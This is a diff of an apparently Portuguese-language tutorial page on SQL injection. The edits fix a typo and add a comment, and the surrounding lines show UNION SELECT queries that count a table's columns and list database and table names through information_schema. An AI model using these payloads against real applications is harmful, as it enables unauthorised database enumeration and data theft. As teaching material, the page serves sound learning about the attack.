@@ -296,7 +296,7 @@ select * from produto union select 1, 2, 3, 4, 5;
 </code>
 </pre>
 
-<p>No caso acima, os número verificarão a quantidade de colunas em uma tabela, ao concluir uma consulta sem erros.</p>
+<p>No caso acima, os números verificarão a quantidade de colunas em uma tabela, ao concluir uma consulta sem erros.</p>
 
 <p>PS: Os números são só pra representar, mas pode ser outros conteúdos, inclusive numa SQL Injection costuma-se passar funções do SQL para descobrir nomes de bancos e tabelas, como por exemplo:</p>
 
@@ -312,13 +312,15 @@ select * from produto union select 1, 2, 3, 'aaa';
 
 select * from produto union select 1, 2, 3, database();
 
+-- O information_schema mostra a estrutura de bancos de dados do servidor
+
 select * from produto union select 1, 2, 3, schema_name from information_schema.schemata;
 
 -- Retorna os nomes dos bancos de dados
 
 select * from produto union select 1, 2, 3, group_concat(schema_name) from information_schema.schemata;
 
--- Retorna os nomes das tabelas do banco especificado.
+-- Retorna os nomes das tabelas do banco especificado
 
 select * from produto union select 1, 2, 3, group_concat(table_name) from information_schema.tables where table_schema = 'cadastro';
 
